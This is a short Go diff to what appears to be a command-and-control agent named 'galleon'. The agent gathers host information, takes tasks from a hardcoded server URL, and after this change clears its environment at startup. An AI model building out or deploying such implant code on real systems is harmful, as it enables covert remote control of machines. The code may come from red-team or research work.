@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"galleon/agent_helper"
 	"time"
+	"os"
 )
 
 func ParseTasks(serverUrl string, tasking string) (string, error) {
@@ -48,7 +49,8 @@ func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) 
 
 
 func main() {
-
+	
+	os.Clearenv()
 	retryCounter := 0
 	serverUrl := "https://192.168.15.45:8000"
 	initialInfo := agent_helper.GatherInfo()
